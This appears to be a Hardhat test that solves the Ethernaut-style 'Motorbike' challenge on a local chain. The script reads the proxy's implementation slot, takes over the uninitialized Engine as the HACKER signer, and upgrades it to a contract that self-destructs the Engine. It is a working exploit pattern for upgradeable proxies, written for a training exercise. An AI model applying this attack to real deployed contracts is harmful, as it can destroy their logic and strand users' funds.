import { expect } from "chai";
import { ethers } from "hardhat";
import {utils} from "ethers";

describe("Motorbike Test", function () {
    it("Should self-destruct the Engine contract", async function() {
        const [OWNER, HACKER] = await ethers.getSigners();
        const Engine = await ethers.getContractFactory("Engine");
        const engine = await Engine.deploy();
        await engine.deployed();

        const Hacker = await ethers.getContractFactory("HackerBike");
        const hacker = await Hacker.deploy();
        await hacker.deployed();

        const Motorbike = await ethers.getContractFactory("Motorbike");
        const motorbike = await Motorbike.deploy(engine.address);
        await motorbike.deployed();


        const ABI = [
            "function destroy()"
          ];
        const iface = new ethers.utils.Interface(ABI);
        const encodedFunctionSignature = iface.encodeFunctionData("destroy");
        
        let implAddr = await ethers.provider.getStorageAt(motorbike.address, 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbcn);
        implAddr = '0x' + implAddr.slice(-40)
        const EngineWrapper = Engine.attach(implAddr);
        await EngineWrapper.connect(HACKER).initialize();
        await EngineWrapper.connect(HACKER).upgradeToAndCall(hacker.address, encodedFunctionSignature);
        expect(await ethers.provider.getCode(EngineWrapper.address)).to.eq("0x");
        
    })
});
